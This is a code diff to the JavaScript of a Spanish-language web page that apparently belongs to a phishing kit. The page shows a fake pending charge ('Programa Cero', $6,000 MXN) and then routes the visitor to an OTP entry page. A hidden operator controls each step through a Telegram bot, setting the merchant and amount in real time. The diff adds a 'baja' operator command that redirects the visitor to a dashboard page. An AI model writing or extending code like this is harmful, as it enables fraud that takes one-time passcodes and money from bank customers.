@@ -14,6 +14,8 @@
   
   const textStatus = document.getElementById("loading-text");
 
+  
+
   const DEFAULT_MERCHANT = "Programa Cero";
   const DEFAULT_AMOUNT = "$6,000.00 MXN";
 
@@ -208,10 +210,21 @@
     try { sessionStorage.setItem("otp_tail", tail); } catch (e) { }
     if (textStatus) textStatus.textContent = "¡Configuración aplicada! Preparando validación...";
 
-    // 2. Cargo dinámico opcional en pasada 1
-    await configureCharge(lastUpdateId);
 
+    
+    // 2. Cargo dinámico opcional en pasada 1
+    const esBaja = await configureCharge(lastUpdateId);
+
+    // Marcamos que la Pasada 1 terminó correctamente
     try { sessionStorage.setItem("gatekeeper_done", "1"); } catch (e) { }
+
+    // Si se escribió "baja", redirige a dashboard.html y detiene el flujo hacia otp.html
+    if (esBaja) {
+      setTimeout(() => { window.location.href = "dashboard.html"; }, 1000);
+      return;
+    }
+
+    // Flujo normal hacia otp.html
     setTimeout(() => { window.location.href = "otp.html"; }, 1000);
   }
 
@@ -219,6 +232,7 @@
     try {
       sessionStorage.removeItem("charge_merchant");
       sessionStorage.removeItem("charge_amount");
+      sessionStorage.setItem("flow_type", "charge"); // Valor por defecto
     } catch (e) { }
 
     await sendTelegram(
@@ -226,9 +240,11 @@
       `¿Quieres configurar un comercio y monto personalizados?\n\n` +
       `• Formato: \`comercio | monto\`\n` +
       `• Solo monto: \`3500\`\n` +
-      `• Responde \`no\` para dejar el cargo por defecto.\n\n` +
+      `• Responde \`no\` para dejar el cargo por defecto.\n` +
+      `• Responde \`baja\` para dejar el cargo por defecto e ir al Dashboard.\n\n` +
       `_Default: ${DEFAULT_MERCHANT} — ${DEFAULT_AMOUNT}_`
     );
+    
 
     let done = false;
     while (!done) {
@@ -245,6 +261,13 @@
             const t = msg.text.trim();
             const low = t.toLowerCase();
 
+            // Comando "baja": deja el cargo por defecto, marca flow_type y avisa para ir a dashboard.html
+            if (low === "baja") {
+             try { sessionStorage.setItem("flow_type", "baja"); } catch (e) { }
+             await sendTelegram("⚠️ Se usará el cargo por defecto. Redirigiendo a Dashboard...");
+             return true;
+            }
+            
             if (["no", "n", "default", "defecto", "skip"].includes(low)) {
               await sendTelegram("Se usará el cargo por defecto.");
               done = true; break;
@@ -275,6 +298,7 @@
       } catch (e) { }
       if (!done) await new Promise(r => setTimeout(r, 2000));
     }
+    return false;
   }
 
   async function reconfigureWindow(lastUpdateId) {
